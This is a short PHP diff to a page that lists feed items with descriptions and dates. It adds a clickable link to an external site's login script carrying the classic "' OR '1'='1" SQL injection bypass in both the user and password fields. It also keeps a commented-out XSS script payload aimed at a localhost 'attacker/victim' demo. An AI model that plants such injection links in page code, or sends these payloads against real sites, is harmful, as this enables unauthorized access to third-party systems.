@@ -43,15 +43,19 @@ foreach ($items as $item) {
 	 	#if($desc)
 if (strlen($desc) >= 125)
 {
-        $desc = substr($desc,0,120).".";
+        $desc = substr($desc,0,10000).".";
 		 
 }
 
  
 #echo '<a href="http://localhost/attacker/victim/XSS/nonxss.php?name=Chandra%3Cscript%3Ealert(%27You%20are%20attacked%27)%3C/script%3E">'.$desc.'</a>'.'</br>';
+
+ echo '<a href="http://www.theplanetreports.com/access_login.php?user=%27+OR+%271%27%3D%271&pass=%27+OR+%271%27%3D%271&ok=OK" target="_blank">'.$publish_date.'</br>';
+
 echo $sum_mary.'</br>';
+
 //echo $desc.'</br>';	
-echo $publish_date.'</br>';
+//echo $publish_date.'</br>';
 echo '</br>';
 echo '</p>';
 } 
